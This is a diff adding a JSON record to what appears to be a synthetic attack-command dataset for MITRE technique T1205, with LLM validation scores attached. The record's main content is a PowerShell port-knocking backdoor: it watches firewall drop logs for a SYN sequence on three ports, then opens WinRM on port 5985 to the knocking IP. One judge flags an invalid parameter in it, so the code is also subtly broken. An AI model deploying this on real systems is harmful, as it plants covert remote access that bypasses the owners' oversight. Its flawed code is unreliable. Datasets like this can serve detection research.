@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; $seq=0; $lastIP=$null; $timeout=[TimeSpan]::FromSeconds(30); $t0=Get-Date; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+TCP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+(81|4455|33890)\\b.*\\btcpsyn\\s+1\\b') { $src=$matches[1]; $dstp=[int]$matches[2]; $now=Get-Date; if (($src -ne $lastIP) -or ($now - $t0 -gt $timeout)) { $seq=0; } $expected=@(81,4455,33890)[$seq]; if ($dstp -eq $expected) { $seq++; $lastIP=$src; $t0=$now; } else { $seq=0; $lastIP=$src; $t0=$now; } if ($seq -ge 3) { $name=\"winrm-synseq-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } $seq=0; } } } }",
+  "explanation": "Uses a TCP SYN knock sequence (81\u21924455\u219233890) on closed ports to open WinRM (5985) for the knocking IP for 10 minutes.",
+  "rationale_steps": [
+    "Enable firewall dropped-packet logging",
+    "Track ordered TCP SYNs to specific ports per source IP with a timeout",
+    "Unlock WinRM when the sequence is correct",
+    "Schedule automatic rule removal"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-e3b1526d",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting/braces and proper pipelines, but includes an invalid Set-NetFirewallProfile parameter (-LogDropped) that would cause a parameter-binding error.",
+        "semantic_score": 3,
+        "semantic_justification": "The logic correctly performs a TCP SYN knock sequence to trigger a temporary firewall rule for WinRM (consistent with T1205), but it will likely fail as written due to the invalid parameter, requires administrative privileges, and assumes remoting (WinRM) is enabled on localhost.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T14:22:54.633553Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced delimiters, valid cmdlets, flags, proper PowerShell syntax, and correct use of regular expressions and control flow.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command perfectly implements traffic signaling logic using firewall log monitoring and sequence detection, its core actions (configuring firewall rules to open WinRM) explicitly require Administrator privileges, which contradicts the stated 'Privilege: None' constraint, preventing full operational success.",
+        "combined_score": 4.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T14:23:28.780277Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
